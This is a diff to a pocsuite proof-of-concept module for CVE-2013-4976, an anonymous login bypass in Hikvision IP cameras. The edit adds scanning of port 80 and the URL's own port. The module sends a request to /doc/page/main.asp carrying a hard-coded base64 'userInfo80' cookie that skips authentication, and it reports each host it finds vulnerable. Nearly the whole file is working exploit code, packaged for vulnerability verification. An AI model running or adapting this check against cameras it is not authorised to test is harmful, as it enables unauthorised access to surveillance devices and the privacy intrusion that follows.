@@ -1,13 +1,14 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+import urlparse
 from pocsuite.net import req
 from pocsuite.poc import POCBase, Output
 from pocsuite.utils import register
 
-def check(ip,port=80):
+def check(uri):
     headers = {'User-Agent':'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
     timeout = 5
-    url = '{}/doc/page/main.asp'.format(ip)
+    url = '{}/doc/page/main.asp'.format(uri)
     cookies= {'userInfo80':'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='}
     try:
         r = req.get(url,headers=headers,cookies=cookies,timeout=timeout)
@@ -22,18 +23,16 @@ def check(ip,port=80):
 
 class TestPOC(POCBase):
     name = 'Hikonvision camara Anonymous User Authentication Bypass'
-    vulID = ''  
+    vulID = '0'
     author = ['hancool']
     vulType = 'login-bypass'
     version = '1.0'    # default version: 1.0
     references = ['']
     desc = '''Hikonvision camara Anonymous User Authentication Bypass
            CVE-2013-4976'''
-
     vulDate = '2013-07-29'
     createDate = '2018-12-21'
     updateDate = '2018-12-21'
-
     appName = 'Hikonvision web'
     appVersion = 'All'
     appPowerLink = ''
@@ -47,19 +46,25 @@ class TestPOC(POCBase):
     def _verify(self):
         """verify mode"""
         result = {}
-        status,msg = check(self.url)
-        if status:
-            result['VerifyInfo'] = {}
-            result['VerifyInfo']['URL'] = msg
-        return self.parse_output(result,msg)
+        pr = urlparse.urlparse(self.url)
+        ports = [80]
+        if pr.port and pr.port not in ports:
+            ports.insert(0, pr.port)
+        for port in ports:
+            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
+            status,msg = check(uri)
+            if status:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
+                break
+        return self.parse_output(result)
 
-    def parse_output(self, result,msg):
+    def parse_output(self, result):
         output = Output(self)
         if result:
             output.success(result)
         else:
-            output.fail(msg)
+            output.fail('not vulnerability')
         return output
-
 
 register(TestPOC)
